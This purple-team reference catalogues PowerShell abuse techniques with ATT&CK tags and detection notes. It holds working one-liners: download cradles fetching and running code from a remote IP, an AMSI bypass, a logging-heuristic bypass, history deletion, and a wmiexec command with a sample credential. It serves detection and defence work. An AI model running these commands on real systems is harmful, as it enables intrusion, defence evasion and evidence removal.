# LOLBins — powershell.exe / pwsh.exe — Hands-On Use Cases

Every scenario below is a documented, legitimate switch or cmdlet — verified against `01 - Overview.md`'s Command-Line Switches table — combined for an operational purpose. What changes per scenario is which switches are stacked, whether the script content ever touches disk, and how much of PowerShell's own logging the technique does or doesn't defeat. MITRE ATT&CK ID(s) are tagged per scenario; every scenario in this note carries **T1059.001** (Command and Scripting Interpreter: PowerShell) as its baseline classification, with additional IDs layered on where relevant.

## Baseline Interactive and Scripted Execution

**MITRE ATT&CK:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/)

```powershell
powershell.exe -File .\enum.ps1
```

The unremarkable case every other scenario below is a variation on — a known script, no obfuscation, no hidden window. Establishing what this looks like matters because it's the noise floor every abuse variant has to hide inside; see the Legitimate-Baseline Contrast scenario at the end of this file.

## Encoded Command Execution

**MITRE ATT&CK:** T1059.001 · [T1027.010](https://attack.mitre.org/techniques/T1027/010/) (Obfuscated Files or Information: Command Obfuscation)

```powershell
# Build the encoded command (operator-side, or generated by a C2/tooling framework)
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://198.51.100.7/stage2.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# Executed on the target
powershell.exe -EncodedCommand $encoded
```

The single most common obfuscation switch in real-world PowerShell abuse. Per `about_PowerShell_exe`, the Base64 payload **must** be UTF-16LE-encoded — this narrow encoding requirement is itself a durable hunting signal (see `05 - Detection and Hunting.md`). Defeats naive `Select-String`-style command-line matching against plaintext IOCs; does **not** defeat Script Block Logging, which records the decoded plaintext.

## Hidden, Unattended Execution

**MITRE ATT&CK:** T1059.001 · [T1564](https://attack.mitre.org/techniques/T1564/) (Hide Artifacts)

```powershell
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "Get-Process | Export-Csv C:\Windows\Temp\p.csv"
```

The combination most likely to appear when PowerShell is launched by another process (a macro, a scheduled task, a C2 implant) rather than a human — no visible console window, no profile-script side effects, and any interactive prompt inside the command fails immediately rather than hanging or drawing attention. **None of these four switches affect Module Logging, Script Block Logging, or Transcription** — see the red-flag callout in `01`.

## Execution Policy Bypass

**MITRE ATT&CK:** T1059.001

```powershell
powershell.exe -ExecutionPolicy Bypass -File .\unsigned_payload.ps1
```

Sets a `Process`-scoped execution policy that permits any script to run for the life of this session only. Per Microsoft's own `about_Execution_Policies` documentation, this doesn't defeat a security boundary in the adversarial sense — the policy "helps prevent the execution of malicious scripts" only by accident, not by design — but it remains one of the most consistently observed flags in malicious PowerShell command lines precisely because it's the fastest way to guarantee a script runs regardless of the target's configured policy, short of a **MachinePolicy/UserPolicy GPO**, which this switch cannot override (see the precedence table in `05`).

## Download Cradle via WebClient.DownloadString

**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer) · T1059.001

```powershell
powershell.exe -NoP -NonI -W Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/stage2.ps1')"
```

The canonical "download cradle" — fetches a remote script's text and immediately hands it to `Invoke-Expression` (`IEX`) for execution, entirely in memory, with no file ever written to disk. `System.Net.WebClient` is a .NET class, not a PowerShell cmdlet, which is why this specific pattern shows up across nearly every PowerShell-based payload framework regardless of language wrapper.

## Download Cradle via Invoke-WebRequest/Invoke-RestMethod

**MITRE ATT&CK:** T1105 · T1059.001

```powershell
powershell.exe -NoP -NonI -W Hidden -Command "IEX (Invoke-WebRequest -Uri 'http://198.51.100.7/stage2.ps1' -UseBasicParsing).Content"
# or, more compactly:
powershell.exe -NoP -NonI -W Hidden -Command "IEX (irm http://198.51.100.7/stage2.ps1)"
```

Functionally identical to the `WebClient` cradle above, using PowerShell's own native cmdlets instead of a raw .NET class call — `-UseBasicParsing` avoids a dependency on Internet Explorer's engine that older PowerShell versions required for the default parsing path. `irm` is the built-in alias for `Invoke-RestMethod`, common in compressed/obfuscated one-liners.

## Stage-to-Disk Download

**MITRE ATT&CK:** T1105

```powershell
powershell.exe -Command "Invoke-WebRequest -Uri 'http://198.51.100.7/beacon.exe' -OutFile 'C:\Windows\Temp\svc.exe'; Start-Process C:\Windows\Temp\svc.exe"
```

Unlike the in-memory cradles above, this variant writes the fetched payload to disk before executing it — slower and noisier (a real filesystem artifact exists), but necessary when the payload isn't itself PowerShell-executable in memory (a compiled EXE/DLL rather than a script). Functionally the PowerShell-native equivalent of the `certutil -urlcache -f ... && ...` chained one-liner documented in `Purple Teaming/LOLBins/certutil/02 - Hands-On Use Cases.md`.

## In-Memory Reflective Assembly Loading

**MITRE ATT&CK:** [T1055](https://attack.mitre.org/techniques/T1055/) (Process Injection) · T1059.001

```powershell
$bytes = (Invoke-WebRequest -Uri 'http://198.51.100.7/Tool.dll' -UseBasicParsing).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
[ToolNamespace.EntryClass]::Main()
```

Loads a .NET assembly directly from a downloaded byte array via `Assembly.Load()` rather than `Assembly.LoadFile()` — no DLL is ever written to disk, and the loaded code runs inside the `powershell.exe`/`pwsh.exe` process's own memory space. This is the general mechanism behind loading GhostPack-style C# tools (Seatbelt, SharpHound's `.NET`-hosted variants, Rubeus) via a PowerShell reflection wrapper rather than launching them as standalone `.exe`s — see `Purple Teaming/Seatbelt/` and `Purple Teaming/BloodHound/SharpHound/` for the tools most commonly loaded this way.

## AMSI Bypass Prior to Payload Execution

**MITRE ATT&CK:** [T1562.001](https://attack.mitre.org/techniques/T1562/001/) (Impair Defenses: Disable or Modify Tools) · T1059.001

This note deliberately does **not** re-derive AMSI bypass mechanics in depth — `Purple Teaming/PowerShell Empire/01 - Overview.md` already documents the well-known `mattifestation` technique live-verified against Empire's own bypass source:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

The pattern: before running a payload the operator expects AMSI/AV to flag, patch the in-process `AmsiUtils` class so the engine believes AMSI initialization already failed, causing it to skip scanning for the remainder of the session. **Important, source-verified distinction from Script Block Logging:** this technique defeats AMSI *content scanning* only — it has no documented effect on Script Block Logging (4104) or Module Logging (4103), which are separate ETW/event-log subsystems the AMSI bypass doesn't touch. An analyst relying on 4104 rather than an AV/EDR AMSI alert still sees the payload's content in plaintext even after a successful AMSI bypass.

## Evading the Automatic Suspicious-String Heuristic

**MITRE ATT&CK:** T1562.001 · T1059.001

```powershell
[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
```

A narrower, less well-known cousin of the AMSI bypass above, documented by security researcher **cobbr** (`cobbr.io`, 2017): PowerShell 5.0+ automatically logs a **Warning-level 4104 event** for any script block matching a hardcoded list of "suspicious" strings (`Add-Type`, `DllImport`, `DefineDynamicAssembly`, `GetField`, `NonPublic`, and others — sourced from the open-source engine's `CompiledScriptBlock.cs`), **even when Script Block Logging is not explicitly enabled**. This reflection-based technique clears that in-memory signature set, silencing the automatic heuristic for the remainder of the session. It does **not** disable Script Block Logging itself if the policy has been explicitly turned on — only the always-on, policy-independent heuristic fallback. See the detection-floor discussion in `05 - Detection and Hunting.md`.

## Post-Execution History Cleanup

**MITRE ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003/) (Indicator Removal: Clear Command History)

```powershell
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

Deletes the PSReadLine on-disk history file after an interactive session — the one PowerShell evidence source that's genuinely on by default (see `01`'s four-pillars table). Notably narrow in scope: this does nothing to any 4103/4104/Transcription events already flushed to the Windows Event Log by the time this command runs, since those live in separate, already-persisted storage the operator's own session can't reach without separately clearing the event log itself (a distinct, far noisier action — see `05`).

## Fleet-Wide Mass Execution

**MITRE ATT&CK:** T1059.001 · T1105

```powershell
# Issued identically across many hosts via GPO immediate task, a C2 framework's
# tasking primitive, or a lateral-movement tool's command-execution feature
powershell.exe -NoP -NonI -W Hidden -Enc <same-base64-blob-across-every-host>
```

The same encoded command pushed to many hosts near-simultaneously — common in ransomware pre-detonation staging or any operation needing the same payload live on every already-compromised host at once. The fleet-level signal is many hosts independently generating **the same Base64 blob** (or the same decoded 4104 content, if logging is enabled) within a tight time window — see the Fleet-Wide Sweep block in `05`.

## Chained Use as a PowerShell Empire Agent

**MITRE ATT&CK:** T1059.001 · [T1071.001](https://attack.mitre.org/techniques/T1071/001/) (Application Layer Protocol: Web Protocols)

```powershell
# Empire's multi_launcher stager for the PowerShell agent language, generated
# server-side and delivered by whatever means got initial access — the target
# executes it verbatim
powershell.exe -noP -sta -w 1 -enc <Empire-generated-base64-stage-0-launcher>
```

PowerShell is one of Empire's five current agent languages (PowerShell, Python 3, C#/Sharpire, IronPython, Go/Gopire — verified in `Purple Teaming/PowerShell Empire/01 - Overview.md`). The stage-0 launcher this note's `-EncodedCommand`-equivalent (`-enc`) mechanics execute is exactly what carries the EKE handshake documented in that folder's How It Works diagram — recognizing **this** command shape as an Empire launcher rather than a one-off encoded command is the difference between flagging an isolated event and recognizing a live C2 checking-in. Full listener/stager/tasking lifecycle: `Purple Teaming/PowerShell Empire/01 - Overview.md`.

## Chained Use via Impacket wmiexec -shell-type powershell

**MITRE ATT&CK:** T1059.001 · [T1047](https://attack.mitre.org/techniques/T1047/) (Windows Management Instrumentation) · [T1021.003](https://attack.mitre.org/techniques/T1021/003/) (Remote Services: DCOM)

```bash
# Operator side (Impacket, attacking host)
wmiexec.py -shell-type powershell CORP/jsmith:Summer2026!@10.10.10.5
```

Every command the operator types in the resulting session is transparently Base64-encoded (UTF-16LE) and launched target-side as `powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc <b64>` — the exact switch combination this note's Hidden/Unattended and Encoded-Command scenarios document, generated automatically by a separate lateral-movement tool rather than typed by the operator. Full mechanics and target-side evidence for the WMI/DCOM execution layer itself: `Purple Teaming/Impacket/wmiexec/02 - Hands-On Use Cases.md` (`Switching to a PowerShell Semi-Interactive Shell`) and `.../04 - Target Evidence.md`.

## Chained Use as a Second-Stage Payload After Another LOLBin

**MITRE ATT&CK:** T1105 · T1059.001

```cmd
:: certutil stages the PowerShell script to disk; PowerShell then executes it —
:: see Purple Teaming/LOLBins/certutil/02 - Hands-On Use Cases.md's own
:: "Chained Download-Then-Execute One-Liner" scenario for the certutil half
certutil.exe -urlcache -f http://198.51.100.7/stage2.ps1 C:\Windows\Temp\s2.ps1 && powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\s2.ps1
```

A common real-world chain: an initial LOLBin with no scripting capability of its own (`certutil`, `bitsadmin`, `mshta`) fetches a PowerShell script, and `powershell.exe`/`pwsh.exe` then does the actual work. Recognizing the **chain** — a `certutil`-shaped file-create event immediately followed by a `powershell.exe` process launch reading the exact same path — is materially higher-confidence than either event in isolation.

## Legitimate-Baseline Contrast

Not an attack — included so an analyst can recognize the noise floor these techniques hide inside:

```powershell
# Scheduled-task-driven maintenance script, no special flags
powershell.exe -File C:\Scripts\Cleanup-TempFiles.ps1

# DSC/CI-CD runner invocation
pwsh.exe -NoProfile -NonInteractive -Command "Invoke-Pester -Path .\tests"
```

Routine automation uses `-NoProfile`/`-NonInteractive` constantly for entirely benign reasons (faster, deterministic startup for unattended jobs) — these two flags alone are **not** a meaningful signal on their own. What distinguishes the abuse scenarios above is the combination with `-WindowStyle Hidden`, `-EncodedCommand`, or a download-cradle command string, not any single flag in isolation. See the Hunting Priority table in `05 - Detection and Hunting.md` for how to weight these signals against each other.
